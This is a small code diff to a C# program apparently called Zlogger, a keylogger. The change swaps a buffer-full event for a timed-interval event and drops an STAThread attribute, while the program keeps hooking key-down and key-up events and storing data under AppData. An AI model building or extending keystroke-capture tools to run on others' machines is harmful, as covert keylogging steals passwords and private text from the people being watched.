@@ -13,7 +13,6 @@ namespace Rodjenihm.Zlogger
 {
     class Program
     {
-        [STAThread]
         static void Main(string[] args)
         {
             var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -26,7 +25,7 @@ namespace Rodjenihm.Zlogger
             {
                 keylogger.KeyDown += KeyloggerEventHandler.HandleKeyDown;
                 keylogger.KeyUp += KeyloggerEventHandler.HandleKeyUp;
-                keylogger.BufferFull += KeyloggerEventHandler.HandleBufferFull;
+                keylogger.IntervalElapsed += KeyloggerEventHandler.HandleIntervalElapsed;
                 keylogger.Run();
                 Application.Run();
             }
